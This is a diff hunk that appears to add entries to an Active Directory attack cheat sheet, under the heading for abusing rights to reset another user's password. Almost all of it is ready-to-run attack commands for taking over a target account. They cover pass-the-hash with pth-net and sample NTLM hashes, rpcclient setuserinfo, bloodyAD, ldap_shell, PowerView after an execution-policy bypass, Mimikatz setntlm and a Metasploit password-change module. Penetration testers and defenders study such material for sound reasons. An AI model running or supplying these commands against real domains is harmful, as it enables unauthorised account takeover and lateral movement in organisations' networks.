@@ -18,6 +18,47 @@ Impacket’s changepassword can also be used to change current user password, if
 
     impacket-changepasswd domain.local/TARGET_USER@DC_IP -newpass ‘Password@987’ -p rpc-samr
 
+#### 4) pth-toolkit (Run Net RPC commands using Pass-the-Hash)
+
+    pth-net rpc password "TARGET_USER" -U domain.local/"USER1"%"64FBAE31CC352FC26AF97CBDEF151E03:"BD0F21ED526A885B378895679A412387" -S DC_IP
+
+#### 5) Rpcclient
+
+    rpcclient -U domain.local/USER1 DC_IP
+    rpcclient $> setuserinfo TARGETUSER 23 Password@987
+
+#### 6) BloodyAD
+
+    bloodyAD --host "DC_IP" -d "domain.local" -u "USER1" -p "Password@1" set password "TARGET_USER" "Password@987"
+
+#### 7) ldap_shell (Change passwords over LDAP)
+
+    ldap_shell domain.local/raj:Password@1 -dc-ip DC_IP
+    change_password TARGET_USER Password@987
+
+#### 8) Powerview
+
+    powershell -ep bypass
+    Import-Module .\PowerView.ps1
+    $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
+    Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword $NewPassword
+
+
+#### 9) Mimikatz
+
+    lsadump::setntlm /server:domain.local /user:TARGET_USER /password:Password@9876
+
+#### 10) Metasploit
+
+    use auxiliary/admin/ldap/change_password
+    set rhosts DC_IP
+    set domain domain.local
+    set username USER1
+    set password Password@1
+    set target_user TARGET_USER
+    set new_password Password@7654
+    run
+
 ### GenericAll / GenericWrite
 
 #### 1) Windows net command
